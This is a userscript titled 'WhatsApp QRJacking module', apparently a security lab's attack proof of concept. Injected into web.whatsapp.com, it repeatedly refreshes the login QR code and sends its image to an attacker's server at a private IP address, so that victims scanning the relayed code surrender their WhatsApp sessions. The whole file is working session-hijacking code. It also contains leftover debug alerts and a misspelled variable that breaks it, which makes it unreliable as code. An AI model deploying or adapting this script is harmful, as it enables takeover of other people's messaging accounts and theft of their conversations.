// ==UserScript==
// @description cho
// @name        WhatsApp QRJacking module
// @namespace   Seekuritylabs (@Seekurity)
// The code will be injected in web.whatsapp.com web page and periodically searching for the element which holds the 
// QR Code image then will perform an XHR request to send this QR image code "base64" code to our server side php script
// which is responsible for converting and storing this "base64 code" to an image file. Also the code is responsible to 
// wake WhatsApp’s QR Code if it is inactive and needs the attacker's interaction to reload it.
// @version 0.0.1.20160802000647
// ==/UserScript==

var myTimer;
myTimer = window.setInterval(loopForQR, 3000);
function loopForQR() {
  if (document.readyState == 'complete') {
	  alert(1);
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
		alert(2);
      //Do some clicks to refresh the qr code if went inactive - Always wakeup the qrcode, Never sleep :D
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
		  alert(3);
        document.getElementsByClassName('qr-button')[0].click();
      }
      //Checking the availability of the qr code - in our example If WhatsApp is not logged in send us the qr code, If not, Do not exhaust our server with false qr code update requests;
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
		  alert(4);
        //Mirror the QR Code to our server
        //This element for example "document.getElementsByTagName('img')[0].src" is WhatsApp's QR code element which contains the base64 value of WhatsApp's qr code!
        var xhttp = new XMLHttpRequest();
        var params = "c=" + document.getElementsByTagName('img')[0].src;
		alert(paraqms);

        xhttp.open('POST', 'https://192.168.80.130/qr/qrHandler.php' , true);
        xhttp.send(params);
      }
    }
  }
}
